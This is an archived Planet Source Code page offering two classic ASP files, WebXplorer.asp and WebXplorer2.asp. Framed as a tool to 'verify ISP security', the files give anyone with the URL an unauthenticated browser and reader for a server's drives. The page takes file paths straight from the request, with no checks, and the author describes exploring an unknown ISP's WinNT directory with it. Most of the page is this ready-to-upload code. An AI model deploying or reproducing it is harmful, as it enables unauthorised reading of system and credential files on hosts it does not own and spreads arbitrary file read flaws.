<div align="center">

## Hack\.\.\. er, uh\.\.\. verify ISP/website security


</div>

### Description

My purpose for this was educational. I was trying to learn the Scripting.FileSystemObjects which were not documented well at the time. You can use it for educational purposes, or to test the security and see how well your server's NT user permissions are locked down (for instance, if your anonymous user can browse and download files from your WinNt directory (which is usually the case!), your permissions are probably not quite up to snuff)
 
### More Info
 
This code (2 pages) is essentially and "explorer" of your ISPs hard drive through ASP. I even did some nifty little icons that you can download here:

'http://liquidmirror.com/OFolder.gif

'http://liquidmirror.com/CFolder.gif

'http://liquidmirror.com/File.gif

' The included screen capture is a shot of an 'unknown' ISPs WinNT directory... the files on the right can be clicked to view their contents, but this feature is very rudimentary and could use some work (i.e., binary streaming)

Remember that there are two files in the code, WebXplorer.asp and WebXplorer2.asp. Have fun! And vote for me!!! I want the Rio!! ;-)

There is a distinct possibility that your ISP may ban you if you upload these and they find out. I almost lost my site because I reported my findings to the adimnistrator, and showed him my page. He thought that I was intentionally trying to hack the site... just be careful with it.


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Mike Stevenson](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/mike-stevenson.md)
**Level**          |Intermediate
**User Rating**    |4.9 (97 globes from 20 users)
**Compatibility**  |ASP \(Active Server Pages\)
**Category**       |[Internet/ Browsers/ HTML](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/internet-browsers-html__4-9.md)
**World**          |[ASP / VbScript](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/asp-vbscript.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/mike-stevenson-hack-er-uh-verify-isp-website-security__4-6121/archive/master.zip)

### API Declarations

```
' I make no claims to this code and
' assume no liability. Do what you
' want with it, just be sure to
' leave me out of it ;-D
```


### Source Code

```
'File1 (WebXplorer.asp)
<%@ LANGUAGE="VBSCRIPT" %>
<HTML>
<HEAD>
	<TITLE>Security Check</TITLE>
</HEAD>
<BODY BGCOLOR="#FFFFFF">
<CENTER><P ALIGN="CENTER">
<TABLE WIDTH="100%" BORDER="0">
<TR><TD ALIGN="LEFT">
<FORM ACTION="Webxplorer.asp" METHOD="GET">
<%
	'Increase the script timeout in case we get a large directory
	Server.ScriptTimeout = 3000
	'Set up the FileSystem objects
	Set fsDrive = CreateObject("Scripting.FileSystemObject")
	Set drvHack = fsDrive.Drives
	'Let's write out drives in a dropdown list bos
	For Each drvType In drvHack
		strDrives = strDrives & "<OPTION VALUE=""" & drvType & """>" & drvType & "</OPTION>"
		x = x + 1
	Next 'drvType
	'The submit button of this form will submit a
	'new Drive path back to this page for parsing
%>
<SELECT NAME="strPath" WIDTH="20">
	<%= strDrives %>
</SELECT>
<INPUT TYPE="SUBMIT" NAME="SUBMIT" VALUE="Change Drive">
</FORM>
</TD></TR>
</TABLE>
	<TABLE WIDTH="100%" BORDER="1" CELLSPACING="2" CELLPADDING="1">
		<TR>
<%
		'Retrieve the requested path (local) from the url
		strDir = Request("strPath")
		if strDir = "" Then strDir = Server.MapPath("/")
		strParse = strDir
		'Make sure that there is a trailing "\" on the path (directory)
		If Right(strParse, 1) <> "\" Then strParse = strParse & "\"
		'Path starts out as something like: "c:\winnt\system32\cache"
		'What we have to do is loop through the string and parse out each chunk
		'at the backslashes "\". Each time we loop, we remove the "\"s and
		'prepend a couple of spaces to the beginning of the string to simulate
		'the indented "sub directory" look. Then we write it out with eithere
		'an opened or closed folder. Here we go....
		'Find out where the first "\" is
		lngPos = InStr(1, strParse, "\")
		'Write out a link to submit this new path back to this page if the user clicks this folder
		strOut = "<A HREF=""WebXplorer.asp?strPath=" & Mid(strParse, 1, lngPos) & """><IMG SRC=""OFolder.gif"" BORDER=""0"">" & Left(strParse, lngPos) & "</A><BR>"
		'Loop thru all of the rest of the sub-directories ("\")
		x = 2
		Do While lngPos <> 0
			oldPos = lngPos
			lngPos = InStr(oldPos + 1, strParse, "\")
			if lngPos = 0 Then Exit Do
			'Use spaces to simulate indentation of sub-dirs
			For y = 1 to x
				strIndent = strIndent & "&nbsp;"
			Next 'y
			strOut = strOut & strIndent & "<A HREF=""WebXplorer.asp?strPath=" & Mid(strParse, 1, lngPos) & """><IMG SRC=""OFolder.gif"" BORDER=""0"">" & Mid(strParse, oldPos + 1, lngPos - (oldPos + 1)) & "</A><BR>"
			'Jump up the nubmer of spaced (indenting)
			x = x + 2
			'Are we at the end? Exit if we are
			if lngPos = Len(strParse) Then Exit Do
		Loop
		'Here we start the left hand side of our "Explorer" view
		Response.Write("<TD width=""50%"" VALIGN=""TOP"">")
		'Write out our monolithic string of folders
		Response.Write(strOut)
		strIndent = strIndent & "&nbsp;&nbsp;"
		'Now we need to get the subdirectories of the _current_ folder ...
		'Get all the required FileSystemObjects set up. Pass in strDir
		Set objFSObject = CreateObject("Scripting.FileSystemObject")
		Set objFolder = objFSObject.GetFolder(strDir)
		'Get the subfolders
		Set colFolders = objFolder.SubFolders
		'Now we loop through all of the subdirectories
		'and write the names/hyperlinks to the html
		For Each intFol in colFolders
			strFName = intFol.name
			Response.Write(strIndent & "<A HREF=""WebXplorer.asp?strPath=" & intFol.Path & """><IMG SRC=""CFolder.gif"" BORDER=""0""> " & strFName &"</a><br>" & vbcrlf)
		Next 'intFol
		Response.Write("</TD>")
		'Ok, now... On to the files in this directory
		Response.Write("<TD width=""50%"" VALIGN=""TOP"">")
		'Same basic idea as the subfolders, but we handle a 'file click'
		'on a different page (WebXplorer2.asp), so make the link go there
		Set colFiles = objFolder.Files
		Response.Write("<TABLE BORDER=0 CELLPADDING=0 CELLSPACING=0>")
		'Loop through each file, construct the image, url, and name
		'and write them out to the html stream using Response.Write
		For Each intF1 in colFiles
			strFName = intF1.name
			response.write "<TR><TD WIDTH=""100%""><A HREF=""WebXplorer2.asp?strFile=" & strParse & strFName & """><IMG SRC=""File.gif"" BORDER=""0""> " & strFName &"</A></TD></TR>"
		Next 'intF1
		Response.Write("</TABLE>&nbsp;</TD>")
%>
		</TR>
	</TABLE>
</P></CENTER>
</BODY>
</HTML>
'File2 (WebXplorer2.asp):
<%@ LANGUAGE="VBSCRIPT" %>
<%
	On Error Resume Next
	'This page attempts to read files from the remote drive and stream
	'them to the browser (remember, it only _attempts_ ... it could use
	'some work. Feel free to get creative in here ;-D )
	'Get the proper objects... Request("strFile") is
	'the name of the file on disk
	Set FileObject = Server.CreateObject("Scripting.FileSystemObject")
	Set Out = FileObject.OpenTextFile (Request("strFile"), 1, FALSE, FALSE)
	If Err <> 0 Then
		'An error occurred. Let's just display it.
%>
<HTML>
<HEAD><TITLE>Security Check: ERROR</TITLE></HEAD>
<BODY>
	<%=Err.Description%>
</BODY>
</HTML>
<%
	Else
		'Otherwise, we're good. Let's read it into a string
		strContents = Out.ReadAll
		Out.Close
		'Write the contents out to the html stream
		Select Case Right(Request("strFile"), 3)
			Case "htm"
				Response.ContentType = "text/HTML"
				Response.Write(strContents)
			Case "asp"
				Response.ContentType = "text/plain"
				strContents = Server.HTMLEncode(strContents)
				strContents = Replace(strContents, vbcrlf, "<BR>")
				Response.Write("<HTML><HEAD></HEAD><BODY>" & strContents & "</BODY>")
			Case "gif"
				Response.ContentType = "image/gif"
				Response.Write(strContents)
			Case "jpg"
				Response.ContentType = "image/jpeg"
				Response.Write(strContents)
			Case "zip"
				Response.ContentType = "application/x-tar"
				Response.Write(strContents)
			Case Else
				Response.ContentType = "text/html"
				Response.Write(Replace(strContents, vbcrlf, "<BR>"))
		End Select
		'Flush the buffer
		'Response.End
	End If
%>
```

